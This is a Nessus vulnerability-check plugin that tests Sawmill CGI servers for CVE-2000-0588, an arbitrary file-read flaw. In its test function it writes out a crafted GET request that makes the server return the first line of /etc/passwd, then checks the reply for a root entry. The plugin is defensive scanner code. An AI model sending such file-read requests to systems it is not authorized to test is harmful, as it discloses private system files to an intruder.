#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10453);
 script_version ("$Revision: 1.22 $");

 script_cve_id("CVE-2000-0588");
 script_bugtraq_id(1402);
 script_xref(name:"OSVDB", value:"352");

 script_name(english: "sawmill allows the reading of the first line of any file");
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to information disclosure." );
 script_set_attribute(attribute:"description", value:
"The remote sawmill CGI allows the reading of the first
line of arbitrary files on the remote system." );
 script_set_attribute(attribute:"solution", value:
"Upgrade SawMill." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 script_summary(english: "Checks if sawmill reads any file");
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("webmirror.nasl", "http_version.nasl");
 script_require_ports(8987, "Services/www");
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function test(port, dir)
{
 local_var	r, u;

 if (! get_port_state(port)) return 0;
 u  = strcat(dir, "/sawmill?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3");
 r = http_send_recv3(method: "GET", item: u, port:port);
 if (isnull(r)) exit(0);
  
 if(egrep(pattern:".*root:.*:0:[01]:.*", string: r[1]+r[2]))
  {
   set_kb_item(name:"Sawmill/readline", value:TRUE);
   set_kb_item(name:"Sawmill/method", value:"standalone");
   security_hole(port);
   return 1;
  }
}

test(port: 8987, dir: "");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
  if (test(port: port, dir: dir)) break;
}

